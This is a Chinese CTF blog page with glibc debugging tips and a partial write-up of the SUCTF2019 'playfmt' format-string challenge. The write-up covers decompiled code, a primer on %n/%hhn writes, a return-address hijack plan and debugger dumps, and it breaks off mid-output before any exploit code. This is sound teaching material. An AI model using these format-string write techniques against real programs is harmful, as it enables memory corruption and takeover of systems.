          <h1 id="搜索libc"><a href="#搜索libc" class="headerlink" title="搜索libc"></a>搜索libc</h1><p> <a href="https://libc.nullbyte.cat/" target="_blank" rel="noopener">https://libc.nullbyte.cat/</a> </p>
<h1 id="恢复linux下静态编译程序的符号表"><a href="#恢复linux下静态编译程序的符号表" class="headerlink" title="恢复linux下静态编译程序的符号表"></a>恢复linux下静态编译程序的符号表</h1><p>先去<a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">https://github.com/push0ebp/sig-database</a>把sig文件都下载下来，然后用ida打开程序之后</p>
<p>选择<code>FILE--&gt;LOAD_FILE--&gt;FLIRT</code>,选择对应版本的<code>libc</code>即可</p>
<p>但是要把相对应的<code>.sig</code>放在<code>($IDA)/sig/pc/</code>目录下</p>
<h1 id="源码调试glibc"><a href="#源码调试glibc" class="headerlink" title="源码调试glibc"></a>源码调试glibc</h1><p>三部曲</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install glibc-source</span><br><span class="line">sudo apt install libc6-dbg</span><br><span class="line">sudo tar -xf /usr/src/glibc/glibc-2.23.tar.xz</span><br></pre></td></tr></table></figure>

<p>搞好后</p>
<p>程序运行时贴上去<br><code>/usr/src/glibc/glibc-2.23/</code>时源码目录，然后后面的文件夹要自己指定下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; directory /usr/src/glibc/glibc-2.23/stdlib/</span><br></pre></td></tr></table></figure>

<p>然后就可以快乐<code>debug</code>了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x7f7c75a3f030</span> &lt;<span class="built_in">exit</span>&gt;          lea    rsi, [rip + <span class="number">0x38a5c1</span>] &lt;<span class="number">0x7f7c75dc95f8</span>&gt;</span><br><span class="line">   <span class="number">0x7f7c75a3f037</span> &lt;<span class="built_in">exit</span>+<span class="number">7</span>&gt;        sub    rsp, <span class="number">8</span></span><br><span class="line"> ► <span class="number">0x7f7c75a3f03b</span> &lt;<span class="built_in">exit</span>+<span class="number">11</span>&gt;       mov    edx, <span class="number">1</span></span><br><span class="line">   <span class="number">0x7f7c75a3f040</span> &lt;<span class="built_in">exit</span>+<span class="number">16</span>&gt;       call   __run_exit_handlers &lt;<span class="number">0x7f7c75a3ef10</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f7c75a3f045</span>                 nop    word ptr cs:[rax + rax]</span><br><span class="line">   <span class="number">0x7f7c75a3f04f</span>                 nop    </span><br><span class="line">   <span class="number">0x7f7c75a3f050</span> &lt;on_exit&gt;       push   rbp</span><br><span class="line">   <span class="number">0x7f7c75a3f051</span> &lt;on_exit+<span class="number">1</span>&gt;     push   rbx</span><br><span class="line">   <span class="number">0x7f7c75a3f052</span> &lt;on_exit+<span class="number">2</span>&gt;     mov    rbx, rdi</span><br><span class="line">   <span class="number">0x7f7c75a3f055</span> &lt;on_exit+<span class="number">5</span>&gt;     lea    rdi, [rip + <span class="number">0x38a59c</span>] &lt;<span class="number">0x7f7c75dc95f8</span>&gt;</span><br><span class="line">   <span class="number">0x7f7c75a3f05c</span> &lt;on_exit+<span class="number">12</span>&gt;    mov    rbp, rsi</span><br><span class="line">──────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────</span><br><span class="line">In file: /usr/src/glibc/glibc<span class="number">-2.23</span>/stdlib/<span class="built_in">exit</span>.c</span><br><span class="line">    <span class="number">99</span> </span><br><span class="line">   <span class="number">100</span> </span><br><span class="line">   <span class="number">101</span> <span class="keyword">void</span></span><br><span class="line">   <span class="number">102</span> <span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">   <span class="number">103</span> &#123;</span><br><span class="line"> ► <span class="number">104</span>   __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">   <span class="number">105</span> &#125;</span><br><span class="line">   <span class="number">106</span> libc_hidden_def (<span class="built_in">exit</span>)</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffb8837a40</span> —▸ <span class="number">0x4008f0</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffb8837a48</span> —▸ <span class="number">0x7f7c75a25837</span> (__libc_start_main+<span class="number">247</span>) ◂— xor    edx, edx</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffb8837a50</span> ◂— <span class="number">0x1</span></span><br><span class="line">03:0018│      0x7fffb8837a58 —▸ 0x7fffb8837b28 —▸ 0x7fffb88391e5 ◂— './easy_printf'</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffb8837a60</span> ◂— <span class="number">0x175ff4ca0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffb8837a68</span> —▸ <span class="number">0x4008c4</span> (main) ◂— push   rbp</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffb8837a70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffb8837a78</span> ◂— <span class="number">0xf14646c49173d8d5</span></span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>7c75a3f03b <span class="built_in">exit</span>+<span class="number">11</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>7c75a25837 __libc_start_main+<span class="number">247</span></span><br></pre></td></tr></table></figure>

<p>舒服死了</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/" class="post-title-link" itemprop="url">SUCTF2019-playfmt-printf的成链攻击</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-11-12 09:06:36" itemprop="dateCreated datePublished" datetime="2019-11-12T09:06:36-08:00">2019-11-12</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-11-13 01:07:08" itemprop="dateModified" datetime="2019-11-13T01:07:08-08:00">2019-11-13</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>首先检查一下程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt</span><br><span class="line">[*] '/mnt/hgfs/share/tmp/playfmt/playfmt'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabledx</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>可以知道我们无法修改got表，栈上的代码不可执行，尝试执行一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt</span><br><span class="line">open flag error , please contact the administrator!</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmt</span><br><span class="line">Testing my C++ skills...</span><br><span class="line">testing <span class="number">1.</span>..</span><br><span class="line">hello,world</span><br><span class="line">testing <span class="number">2.</span>..</span><br><span class="line">hello,world</span><br><span class="line">testing <span class="number">3.</span>..</span><br><span class="line">You think I will leave the flag?</span><br><span class="line">hello,world</span><br><span class="line">=====================</span><br><span class="line">  Magic echo Server</span><br><span class="line">=====================</span><br></pre></td></tr></table></figure>

<p>用IDA Pro查看一下源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  derived *v3; <span class="comment">// ebx</span></span><br><span class="line">  derived *v4; <span class="comment">// ebx</span></span><br><span class="line">  derived *v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [esp+0h] [ebp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  v8 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"open flag error , please contact the administrator!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fscanf</span>(stream, <span class="string">"%s"</span>, v8);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Testing my C++ skills..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 1..."</span>);</span><br><span class="line">  v3 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v3);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v3)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 2..."</span>);</span><br><span class="line">  v4 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    derived::~derived(v4);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v4)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"testing 3..."</span>);</span><br><span class="line">  v5 = (derived *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>);</span><br><span class="line">  derived::derived(v5, v8);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You think I will leave the flag?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    base::~base(v5);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v5)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = Get_return_addr();</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">if</span> ( Get_return_addr() != v6 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到关键功能函数<strong>logo</strong></p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">logo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v0 = Get_return_addr();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  Magic echo Server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"====================="</span>);</span><br><span class="line">  do_fmt();</span><br><span class="line">  result = Get_return_addr() != v0;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到漏洞点<strong>do_fmt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 程序漏洞点比较明显，直接写了一个循环的<code>printf</code>格式化漏洞，而输入的数据是存储在<code>buf</code>指针上</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/tmp/playfmt$ readelf -S playfmt</span><br><span class="line">There are 30 section headers, starting at offset 0x2c44:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 0000b4 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          08048260 000260 000190 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080483f0 0003f0 000159 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804854a 00054a 000032 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804857c 00057c 000060 00   A  6   2  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080485dc 0005dc 000098 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048674 000674 000008 08  AI  5  23  4</span><br><span class="line">  [11] .init             PROGBITS        0804867c 00067c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080486a0 0006a0 000020 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080486c0 0006c0 000090 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048750 000750 000532 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048c84 000c84 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048c98 000c98 0000e9 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048d84 000d84 00007c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048e00 000e00 000218 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      0804ae98 001e98 000008 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      0804aea0 001ea0 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        0804aea4 001ea4 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         0804aea8 001ea8 000100 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        0804afa8 001fa8 000058 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804b000 002000 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804b020 002008 0000ec 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 002008 000035 01  MS  0   0  1</span><br><span class="line">  [27] .shstrtab         STRTAB          00000000 002b40 000101 00      0   0  1</span><br><span class="line">  [28] .symtab           SYMTAB          00000000 002040 000660 10     29  49  4</span><br><span class="line">  [29] .strtab           STRTAB          00000000 0026a0 0004a0 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>

<p><code>buf</code>则是位于<strong>bss</strong>段中地址为<strong>0x0804B040</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804B</span>040                 <span class="keyword">public</span> buf</span><br><span class="line">.bss:<span class="number">0804B</span>040 ; <span class="keyword">char</span> buf[<span class="number">200</span>]</span><br><span class="line">.bss:<span class="number">0804B</span>040 buf             db <span class="number">0</span><span class="function">C8h <span class="title">dup</span><span class="params">(?)</span>    </span>; DATA XREF: do_fmt(<span class="keyword">void</span>)+E↑o</span><br></pre></td></tr></table></figure>

<p> 所以思路就是直接修改栈上的返回地址，<code>return</code>的时候劫持流程</p>
<p>我们首先复习一下格式化字符</p>
<p>格式化字符串漏洞的具体原理就不再详细叙述，这里主要简单介绍一下格式化参数位置的计算和漏洞利用时常用的格式字符。</p>
<ul>
<li>参数位置计算</li>
</ul>
<p>linux下32位程序是栈传参，从左到右参数顺序为<code>$esp+4,$esp+8,...</code>；因此<code>$esp+x</code>的位置应该是格式化第<code>x/4</code>个参数。</p>
<p>linux下64位程序是寄存器加栈传参，从左到右参数顺序为<code>$rdi,$rsi,$rdx,$rcx,$r8,$r9,$rsp+8,...</code>；因此<code>$rsp+x</code>的位置应该是格式化第<code>x/8+6</code>个参数。</p>
<ul>
<li>常用的格式化字符</li>
</ul>
<p>用于地址泄露的格式化字符有：<code>%x、%s、%p</code>等；</p>
<p>用于地址写的格式化字符：<code>%hhn</code>（写入一字节），<code>%hn</code>（写入两字节），<code>%n</code>（32位写四字节，64位写8字节）；</p>
<p><code>%&lt; number&gt;$type</code>：直接作用第number个位置的参数，如：<code>%7$x</code>读第7个位置参数值，<code>%7$n</code>对第7个参数位置进行写。</p>
<p><code>%c</code>：输出<strong>number</strong>个字符，配合<code>%n</code>进行任意地址写，例如<code>&quot;%{}c%{}$hhn&quot;.format(address,offset)</code>就是向<code>offset0</code>参数指向的地址最低位写成<code>address</code></p>
<p>一般来说，栈上的格式化字符串漏洞利用步骤是先泄露地址，包括<strong>ELF</strong>程序地址和<strong>libc</strong>地址；然后将需要改写的<strong>GOT</strong>表地址直接传到栈上，同时利用<code>%c%n</code>的方法改写入<code>system或one_gadget</code>地址，最后就是劫持流程。但是对于<strong>BSS</strong>段或是堆上格式化字符串，无法直接将想要改写的地址指针放置在栈上，也就没办法实现任意地址写。 </p>
<p>那我们就先下一个断点在printf执行之前，看看栈上有什么可以利用的东西</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0xffffd030</span> —▸ <span class="number">0x804b040</span> (buf) ◂— <span class="number">0xa</span> <span class="comment">/* '\n' */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│      <span class="number">0xffffd034</span> —▸ <span class="number">0x8048cac</span> ◂— jno    <span class="number">0x8048d23</span> <span class="comment">/* 'quit' */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│      <span class="number">0xffffd038</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│      <span class="number">0xffffd03c</span> —▸ <span class="number">0x80488e8</span> (logo()+<span class="number">59</span>) ◂— add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│      <span class="number">0xffffd040</span> —▸ <span class="number">0x8048cb1</span> ◂— cmp    eax, <span class="number">0x3d3d3d3d</span> <span class="comment">/* '=====================' */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│      <span class="number">0xffffd044</span> —▸ <span class="number">0x8048ac4</span> (main+<span class="number">440</span>) —▸ <span class="number">0xfffd82e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│ ebp  <span class="number">0xffffd048</span> —▸ <span class="number">0xffffd068</span> —▸ <span class="number">0xffffd098</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│      <span class="number">0xffffd04c</span> —▸ <span class="number">0x80488f0</span> (logo()+<span class="number">67</span>) —▸ <span class="number">0xffff56e8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│      <span class="number">0xffffd050</span> —▸ <span class="number">0xf7e30000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1d7d6c</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> <span class="number">0x8048000</span>  <span class="number">0x804a000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804a000</span>  <span class="number">0x804b000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804b000</span>  <span class="number">0x804c000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /mnt/hgfs/share/tmp/playfmt/playfmt</span><br><span class="line"> <span class="number">0x804c000</span>  <span class="number">0x806e000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>      [heap]</span><br><span class="line"><span class="number">0xf7b36000</span> <span class="number">0xf7b38000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </span><br><span class="line"><span class="number">0xf7b38000</span> <span class="number">0xf7b54000</span> r-xp    <span class="number">1</span>c000 <span class="number">0</span>      /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b54000</span> <span class="number">0xf7b55000</span> r--p     <span class="number">1000</span> <span class="number">1b</span>000  /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b55000</span> <span class="number">0xf7b56000</span> rw-p     <span class="number">1000</span> <span class="number">1</span>c000  /lib/i386-linux-gnu/libgcc_s.so<span class="number">.1</span></span><br><span class="line"><span class="number">0xf7b56000</span> <span class="number">0xf7c56000</span> r-xp   <span class="number">100000</span> <span class="number">0</span>      